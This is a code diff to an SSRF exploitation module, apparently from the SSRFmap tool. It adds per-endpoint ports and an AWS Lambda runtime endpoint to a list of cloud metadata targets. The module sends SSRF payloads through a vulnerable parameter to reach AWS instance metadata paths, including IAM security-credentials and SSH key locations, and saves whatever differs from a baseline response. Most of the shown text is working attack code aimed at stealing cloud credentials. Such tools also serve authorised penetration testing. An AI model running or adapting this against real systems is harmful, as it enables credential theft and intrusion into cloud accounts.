@@ -8,7 +8,8 @@ author        = "Swissky"
 documentation = [
     "https://hackerone.com/reports/53088",
     "https://hackerone.com/reports/285380",
-    "https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/"
+    "https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/",
+    "https://twitter.com/spengietz/status/1161317376060563456"
 ]
 
 class exploit():
@@ -28,7 +29,7 @@ class exploit():
                 os.makedirs(directory)
 
             for endpoint in self.endpoints:
-                payload = wrapper_http(endpoint[1], endpoint[0] , "80")
+                payload = wrapper_http(endpoint[1], endpoint[0] , endpoint[2])
                 r  = requester.do_request(args.param, payload)
                 diff = diff_text(r.text, default)
                 if diff != "":
@@ -48,15 +49,16 @@ class exploit():
 
 
     def add_endpoints(self):
-        self.endpoints.add( ("169.254.169.254","latest/user-data") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/ami-id") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/reservation-id") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/hostname") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/0/openssh-key") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/1/openssh-key") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/2/openssh-key") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/dummy") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/ecsInstanceRole") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/") )
-        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/") )
-        self.endpoints.add( ("169.254.169.254","latest/user-data/") )
+        self.endpoints.add( ("169.254.169.254","latest/user-data", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/ami-id", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/reservation-id", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/hostname", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/0/openssh-key", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/1/openssh-key", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/2/openssh-key", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/dummy", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/ecsInstanceRole", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/iam/security-credentials/", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/meta-data/public-keys/", "80") )
+        self.endpoints.add( ("169.254.169.254","latest/user-data/", "80") )
+        self.endpoints.add( ("localhost","2018-06-01/runtime/invocation/next", "9001") )
